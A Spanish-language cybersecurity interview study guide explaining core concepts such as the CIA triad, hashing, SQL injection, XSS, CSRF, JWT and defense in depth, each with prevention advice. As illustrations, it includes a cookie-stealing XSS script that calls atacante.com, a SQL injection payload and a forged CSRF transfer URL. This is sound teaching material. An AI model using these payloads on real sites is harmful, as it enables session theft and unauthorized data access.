---
tema: Preguntas de entrevista — Ciberseguridad
estado: completo
---

# Preguntas de Entrevista — Seguridad Informática

> Lee la pregunta, intenta responder en voz alta, luego lee la respuesta. No memorices — entiende el concepto.

---

## Fundamentos de seguridad

**¿Qué es la CIA Triad?**

Son los tres pilares de la seguridad de la información:

- **Confidencialidad**: solo las personas autorizadas pueden acceder a la información.
- **Integridad**: la información no ha sido modificada sin autorización.
- **Disponibilidad**: el sistema y los datos están accesibles cuando se necesitan.

Cada control de seguridad protege uno o más de estos tres principios.

---

**¿Cuál es la diferencia entre autenticación y autorización?**

- **Autenticación**: verificar *quién eres*. ¿Eres realmente el usuario "Laura"? (contraseña, biometría, OTP)
- **Autorización**: verificar *qué puedes hacer*. ¿Tiene "Laura" permiso para acceder a este recurso?

Primero autenticas, luego autorizas. Un usuario puede estar autenticado pero no autorizado para ciertos recursos.

---

**¿Qué es el principio de mínimo privilegio?**

Cada usuario, proceso o sistema debe tener solo los permisos mínimos necesarios para hacer su trabajo. Si un atacante compromete esa cuenta, el daño queda limitado.

Ejemplo: un empleado de soporte técnico no debería tener acceso a la base de datos de salarios.

---

**¿Qué diferencia hay entre cifrado simétrico y asimétrico?**

| | Simétrico | Asimétrico |
|---|---|---|
| Claves | Una sola clave (cifra y descifra) | Par de claves: pública (cifra) y privada (descifra) |
| Velocidad | Rápido | Más lento |
| Problema | ¿Cómo compartes la clave de forma segura? | No hay problema — la clave pública es pública |
| Ejemplos | AES, DES | RSA, ECC |
| Uso típico | Cifrar volúmenes grandes de datos | HTTPS handshake, firmas digitales, SSH |

En la práctica HTTPS usa ambos: asimétrico para intercambiar la clave, simétrico para la transmisión.

---

**¿Qué es un hash y para qué se usa en seguridad?**

Una función de hash convierte cualquier dato en un valor de tamaño fijo (huella digital). Es unidireccional: no se puede recuperar el dato original del hash.

Usos en seguridad:
- **Contraseñas**: se guarda el hash, no la contraseña en texto plano.
- **Integridad de archivos**: si el hash cambia, el archivo fue modificado.
- **Firmas digitales**: se firma el hash del documento, no el documento completo.

Algoritmos: SHA-256, SHA-3, bcrypt (para contraseñas — agrega salt automáticamente).

---

## Vulnerabilidades web (OWASP Top 10)

**¿Qué es SQL Injection y cómo se previene?**

Un atacante inserta código SQL en un campo de entrada para manipular la consulta de la base de datos.

```sql
-- Consulta vulnerable
SELECT * FROM usuarios WHERE nombre = '<input_usuario>';

-- Si el usuario escribe: ' OR '1'='1
-- La consulta queda:
SELECT * FROM usuarios WHERE nombre = '' OR '1'='1';
-- Resultado: devuelve TODOS los usuarios
```

**Prevención:**
- Usar **consultas preparadas** (prepared statements / parámetros vinculados).
- Nunca concatenar input del usuario directamente en SQL.

```python
# Mal (vulnerable)
query = f"SELECT * FROM usuarios WHERE nombre = '{nombre}'"

# Bien (seguro)
cursor.execute("SELECT * FROM usuarios WHERE nombre = %s", (nombre,))
```

---

**¿Qué es XSS (Cross-Site Scripting)?**

El atacante inyecta código JavaScript malicioso en una página web. Cuando otro usuario la visita, el script se ejecuta en su navegador.

```html
<!-- Formulario vulnerable que muestra el nombre sin escapar -->
<p>Bienvenido, <script>document.location='http://atacante.com/?cookie='+document.cookie</script></p>
```

**Prevención:**
- Escapar/sanitizar todo el input antes de renderizarlo en HTML.
- Usar encabezados HTTP: `Content-Security-Policy`.
- En frameworks modernos (React, Vue) el escape es automático.

---

**¿Qué es CSRF (Cross-Site Request Forgery)?**

El atacante engaña al usuario para que haga un request a un sitio en el que ya está autenticado, sin que el usuario lo sepa.

Ejemplo: abres un email con una imagen cuya URL es `https://banco.com/transferir?cuenta=atacante&monto=10000`. Si tienes sesión activa en el banco, el request se ejecuta.

**Prevención:**
- Tokens CSRF: el servidor incluye un token único en cada formulario. El atacante no puede conocerlo.
- Verificar el header `Origin` / `Referer`.
- Cookies con `SameSite=Strict` o `SameSite=Lax`.

---

**¿Qué es un ataque de fuerza bruta y cómo se mitiga?**

El atacante prueba combinaciones de contraseñas automáticamente hasta encontrar la correcta.

**Mitigaciones:**
- Limitar intentos fallidos (rate limiting / bloqueo temporal).
- Implementar CAPTCHA después de N intentos.
- Usar contraseñas largas y aleatorias (más combinaciones posibles).
- Autenticación multifactor (MFA) — incluso si adivinan la contraseña, necesitan el segundo factor.

---

## Seguridad en aplicaciones

**¿Cómo se deben guardar las contraseñas en una base de datos?**

Nunca en texto plano. Siempre como hash con sal (salt):

1. Generar un salt aleatorio único por usuario.
2. Calcular `hash(contraseña + salt)` con un algoritmo lento como bcrypt o argon2.
3. Guardar el salt y el hash en la BD.

Al verificar: calculas el hash con el mismo salt y lo comparas.

**Por qué salt:** impide que dos usuarios con la misma contraseña tengan el mismo hash, y protege contra ataques con tablas rainbow.

---

**¿Qué es JWT (JSON Web Token)?**

Un token compacto y autocontenido para transmitir información entre partes de forma verificable. Se usa para autenticación sin estado (stateless).

Estructura: `header.payload.signature`

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiTGF1cmEifQ.abc123...
```

- **Header**: algoritmo de firma (ej. HS256)
- **Payload**: datos (usuario, roles, expiración) — NO cifrado, solo codificado en Base64
- **Signature**: hash del header+payload con una clave secreta — verifica que no fue modificado

**Importante:** el payload es legible por cualquiera. No guardar datos sensibles en él.

---

**¿Qué es HTTPS y por qué es importante?**

HTTPS = HTTP + TLS. TLS cifra la comunicación entre el navegador y el servidor.

Sin HTTPS:
- Cualquier nodo en la red puede leer el tráfico (contraseñas, datos personales).
- Un atacante puede modificar el contenido en tránsito (ataque man-in-the-middle).

Con HTTPS:
- El contenido está cifrado.
- El certificado digital verifica la identidad del servidor.

---

## Arquitectura y buenas prácticas

**¿Qué es defensa en profundidad?**

Estrategia que usa múltiples capas de seguridad. Si una capa falla, las demás siguen protegiendo. Igual que un castillo tiene foso, muralla, torres y guardia interior.

Ejemplo en una aplicación web:
1. Firewall / WAF
2. Validación de inputs en frontend
3. Validación en backend
4. Consultas preparadas (contra SQL injection)
5. BD con permisos mínimos
6. Logs y alertas de anomalías

---

**¿Qué es un pentest?**

Una prueba de penetración: alguien con autorización intenta hackear el sistema para encontrar vulnerabilidades antes de que lo haga un atacante real. El resultado es un reporte con las vulnerabilidades encontradas y recomendaciones.

---

**¿Qué son los logs de auditoría y por qué importan?**

Registros de quién hizo qué y cuándo en el sistema. Son esenciales para:
- Detectar actividad sospechosa.
- Investigar incidentes de seguridad después de que ocurren.
- Cumplir regulaciones (GDPR, ISO 27001, etc.).

Un log de auditoría no debe poder ser modificado por el mismo sistema que lo genera.
